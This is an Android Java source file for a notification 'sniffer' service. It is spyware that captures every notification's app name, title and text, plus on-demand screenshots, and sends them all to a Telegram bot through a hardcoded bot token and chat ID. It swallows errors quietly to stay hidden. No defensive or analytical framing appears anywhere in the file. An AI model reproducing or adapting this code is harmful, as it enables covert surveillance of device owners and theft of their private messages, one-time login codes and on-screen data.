package com.v8.global.sniffer;

import android.app.Notification;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private int screenWidth, screenHeight, screenDensity;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isProjectionSetup = false;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
            
            setupMediaProjection();
        } catch (Exception e) {
            sendToTelegram("❌ NotificationService Error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (intent != null && "TAKE_SCREENSHOT".equals(intent.getAction())) {
                takeScreenshot();
            }
        } catch (Exception e) {
            sendToTelegram("❌ Screenshot Error: " + e.getMessage());
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void setupMediaProjection() {
        try {
            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
            if (resultCode != -1 && dataUri != null && !dataUri.isEmpty()) {
                Intent data = Intent.parseUri(dataUri, 0);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && data != null) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                    isProjectionSetup = true;
                }
            }
        } catch (Exception e) {
            sendToTelegram("❌ MediaProjection Setup Error: " + e.getMessage());
        }
    }

    private void takeScreenshot() {
        try {
            if (mediaProjection == null) {
                setupMediaProjection();
                if (mediaProjection == null) {
                    sendToTelegram("❌ لا يمكن التقاط الشاشة - صلاحية التسجيل غير مفعلة");
                    return;
                }
            }

            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                "Screenshot", screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null
            );

            handler.postDelayed(() -> {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
                        sendScreenshot(bitmap);
                        image.close();
                        bitmap.recycle();
                    }
                    virtualDisplay.release();
                    imageReader.close();
                } catch (Exception e) {
                    sendToTelegram("❌ Screenshot Capture Error: " + e.getMessage());
                }
            }, 500);
        } catch (Exception e) {
            sendToTelegram("❌ Screenshot Error: " + e.getMessage());
        }
    }

    private void sendScreenshot(Bitmap bitmap) {
        try {
            File file = new File(getCacheDir(), "screenshot.jpg");
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
            out.close();
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "screenshot.jpg",
                        RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            sendToTelegram("❌ Send Screenshot Error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            String pkg = sbn.getPackageName();
            
            if (title.isEmpty() && text.isEmpty()) return;
            
            String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
            sendToTelegram(message);
        } catch (Exception e) {
            // لا نرسل خطأ هنا عشان ما نسبب كراش
        }
    }

    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    @Override
    public void onListenerConnected() {
        sendToTelegram("✅ Notification Service Connected");
    }
                                            }
